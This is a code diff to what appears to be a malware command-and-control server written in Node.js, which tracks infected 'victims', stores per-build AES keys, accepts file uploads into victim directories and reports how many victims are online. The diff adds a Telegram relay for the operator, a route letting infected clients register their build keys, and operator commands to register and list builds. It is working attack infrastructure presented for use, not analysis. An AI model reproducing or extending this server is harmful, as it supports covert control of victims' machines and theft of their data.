@@ -49,6 +49,9 @@ const config = loadJson(CONFIG_PATH, {
 // host env wins: render sets its own PORT; OP_SECRET keeps the secret out of the repo
 if (process.env.PORT) config.port = parseInt(process.env.PORT, 10) || config.port;
 config.operatorSecret = process.env.OP_SECRET || config.operatorSecret;
+// telegram relay can be enabled purely from env — no repo secrets needed
+if (process.env.TG_TOKEN) config.tg = Object.assign({}, config.tg, { token: process.env.TG_TOKEN });
+if (process.env.TG_ADMIN) config.tg = Object.assign({}, config.tg, { adminChat: process.env.TG_ADMIN });
 
 // keys.json = { builds: { "<buildId>": { aesKey: "<64 hex>", name: "<label>" } } }
 let keys = loadJson(KEYS_PATH, { builds: {} });
@@ -362,6 +365,18 @@ function routeClient(conn, msg) {
       bumpMeta(buildId, vid, {});
       logEvent(buildId, vid, msg.cat || 'event', msg.data);
       break;
+    case 'regkey':
+      // append-only build-key registration from an authed client. Never
+      // overwrites an existing build (operator 'register' is the upsert).
+      const rb = String(msg.buildId || '').trim();
+      const rk = String(msg.aesKey || '').trim();
+      if (!/^[0-9a-f]{8,32}$/.test(rb) || !/^[0-9a-f]{64}$/.test(rk)) break;
+      if (keys.builds[rb]) break;
+      if (Object.keys(keys.builds).length >= 500) break;
+      keys.builds[rb] = { aesKey: rk, name: String(msg.name || rb).slice(0, 40) };
+      saveKeys();
+      conn.send({ t: 'ok', c: 'regkey' });
+      break;
     case 'up': {
       // upload: binary or base64 payload, server writes to victim dir under msg.path
       bumpMeta(buildId, vid, {});
@@ -430,6 +445,25 @@ function routeOperator(conn, msg) {
       let online = 0, cmds = 0, up = 0;
       for (const v of loadVictims()) { if (sessions.has(v.vid)) online++; }
       conn.send({ t: 'ok', o: 'stats', online, total: loadVictims().length, uptime: Math.floor(process.uptime()) });
+      break;
+    }
+    case 'register': {
+      // operator upsert: teach the server a build's key (bootstrap + fixes).
+      const b = String(msg.buildId || '').trim();
+      const k = String(msg.aesKey || '').trim();
+      if (!/^[0-9a-f]{8,32}$/.test(b) || !/^[0-9a-f]{64}$/.test(k))
+        return conn.send({ t: 'err', o: 'register', why: 'bad buildId/aesKey' });
+      if (Object.keys(keys.builds).length >= 500)
+        return conn.send({ t: 'err', o: 'register', why: 'build cap reached' });
+      keys.builds[b] = { aesKey: k, name: String(msg.name || b).slice(0, 40) };
+      saveKeys();
+      conn.send({ t: 'ok', o: 'register', builds: Object.keys(keys.builds).length });
+      break;
+    }
+    case 'listb': {
+      const list = Object.keys(keys.builds)
+        .map((b) => ({ buildId: b, name: (keys.builds[b] || {}).name || b }));
+      conn.send({ t: 'ok', o: 'listb', builds: list });
       break;
     }
     default:
